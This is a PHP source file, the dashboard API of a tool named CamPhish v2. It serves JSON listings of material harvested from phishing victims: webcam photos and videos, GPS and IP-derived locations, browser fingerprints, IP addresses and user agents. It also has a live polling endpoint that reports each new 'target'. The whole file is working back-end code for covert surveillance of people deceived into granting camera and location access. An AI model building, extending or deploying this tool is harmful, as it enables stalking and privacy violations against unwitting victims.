<?php
// CamPhish v2 - Dashboard API
// Provides JSON data for the monitoring dashboard

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$action = isset($_GET['action']) ? $_GET['action'] : 'overview';
$baseDir = dirname(__FILE__) . '/..';

switch ($action) {

    case 'overview':
        // Count all data
        $photos = glob($baseDir . '/cam*.png');
        $videos = glob($baseDir . '/video_*.webm');
        $locations = glob($baseDir . '/saved_locations/location_*.txt');
        $ipLocations = glob($baseDir . '/saved_locations/ip_location_*.txt');
        $fingerprints = glob($baseDir . '/saved_fingerprints/fingerprint_*.txt');
        $ipFile = $baseDir . '/saved.ip.txt';
        
        // Count unique IPs
        $uniqueIPs = [];
        if (file_exists($ipFile)) {
            $content = file_get_contents($ipFile);
            preg_match_all('/IP:\s*(.+)/', $content, $matches);
            $uniqueIPs = array_unique(array_map('trim', $matches[1]));
        }

        echo json_encode([
            'status' => 'success',
            'data' => [
                'sessions' => count($uniqueIPs),
                'photos' => count($photos),
                'videos' => count($videos),
                'locations' => count($locations) + count($ipLocations),
                'fingerprints' => count($fingerprints),
                'ips' => array_values($uniqueIPs)
            ]
        ]);
        break;

    case 'photos':
        $photos = glob($baseDir . '/cam*.png');
        usort($photos, function($a, $b) { return filemtime($b) - filemtime($a); });
        $photoList = [];
        foreach (array_slice($photos, 0, 50) as $p) {
            $photoList[] = [
                'file' => basename($p),
                'path' => '../' . basename($p),
                'size' => filesize($p),
                'time' => date('Y-m-d H:i:s', filemtime($p))
            ];
        }
        echo json_encode(['status' => 'success', 'data' => $photoList]);
        break;

    case 'locations':
        $locations = [];
        
        // GPS locations
        $gpsFiles = glob($baseDir . '/saved_locations/location_*.txt');
        foreach ($gpsFiles as $f) {
            $content = file_get_contents($f);
            $loc = ['type' => 'GPS', 'file' => basename($f), 'time' => date('Y-m-d H:i:s', filemtime($f))];
            if (preg_match('/Latitude:\s*(.+)/', $content, $m)) $loc['lat'] = trim($m[1]);
            if (preg_match('/Longitude:\s*(.+)/', $content, $m)) $loc['lon'] = trim($m[1]);
            if (preg_match('/Accuracy:\s*(.+)/', $content, $m)) $loc['accuracy'] = trim($m[1]);
            if (preg_match('/Google Maps:\s*(.+)/', $content, $m)) $loc['maps'] = trim($m[1]);
            $locations[] = $loc;
        }
        
        // IP locations
        $ipFiles = glob($baseDir . '/saved_locations/ip_location_*.txt');
        foreach ($ipFiles as $f) {
            $content = file_get_contents($f);
            $loc = ['type' => 'IP-Based', 'file' => basename($f), 'time' => date('Y-m-d H:i:s', filemtime($f))];
            if (preg_match('/City:\s*(.+)/', $content, $m)) $loc['city'] = trim($m[1]);
            if (preg_match('/Country:\s*(.+)/', $content, $m)) $loc['country'] = trim($m[1]);
            if (preg_match('/Latitude:\s*(.+)/', $content, $m)) $loc['lat'] = trim($m[1]);
            if (preg_match('/Longitude:\s*(.+)/', $content, $m)) $loc['lon'] = trim($m[1]);
            if (preg_match('/ISP:\s*(.+)/', $content, $m)) $loc['isp'] = trim($m[1]);
            $locations[] = $loc;
        }
        
        usort($locations, function($a, $b) { return strcmp($b['time'], $a['time']); });
        echo json_encode(['status' => 'success', 'data' => $locations]);
        break;

    case 'fingerprints':
        $fingerprints = glob($baseDir . '/saved_fingerprints/fingerprint_*.txt');
        usort($fingerprints, function($a, $b) { return filemtime($b) - filemtime($a); });
        $fpList = [];
        foreach (array_slice($fingerprints, 0, 20) as $f) {
            $fpList[] = [
                'file' => basename($f),
                'content' => file_get_contents($f),
                'time' => date('Y-m-d H:i:s', filemtime($f))
            ];
        }
        echo json_encode(['status' => 'success', 'data' => $fpList]);
        break;

    case 'sessions':
        $ipFile = $baseDir . '/saved.ip.txt';
        $sessions = [];
        if (file_exists($ipFile)) {
            $lines = file($ipFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            $currentSession = [];
            foreach ($lines as $line) {
                if (strpos($line, 'IP:') === 0) {
                    if (!empty($currentSession)) $sessions[] = $currentSession;
                    $currentSession = ['ip' => trim(substr($line, 3))];
                } elseif (strpos($line, 'User-Agent:') !== false) {
                    $currentSession['userAgent'] = trim(substr($line, strpos($line, ':') + 1));
                }
            }
            if (!empty($currentSession)) $sessions[] = $currentSession;
        }
        
        // Add photo counts per session
        foreach ($sessions as &$s) {
            $s['photoCount'] = count(glob($baseDir . '/cam*.png'));
        }
        
        echo json_encode(['status' => 'success', 'data' => array_reverse($sessions)]);
        break;

    case 'live':
        // Check for new data (polling endpoint)
        $newData = [];
        if (file_exists($baseDir . '/ip.txt')) {
            $newData['newTarget'] = file_get_contents($baseDir . '/ip.txt');
        }
        if (file_exists($baseDir . '/current_location.txt')) {
            $newData['newLocation'] = file_get_contents($baseDir . '/current_location.txt');
        }
        if (file_exists($baseDir . '/current_fingerprint.txt')) {
            $newData['newFingerprint'] = file_get_contents($baseDir . '/current_fingerprint.txt');
        }
        if (file_exists($baseDir . '/current_ip_location.txt')) {
            $newData['newIPLocation'] = file_get_contents($baseDir . '/current_ip_location.txt');
        }
        echo json_encode(['status' => 'success', 'data' => $newData, 'timestamp' => time()]);
        break;

    default:
        echo json_encode(['status' => 'error', 'message' => 'Unknown action']);
}
?>
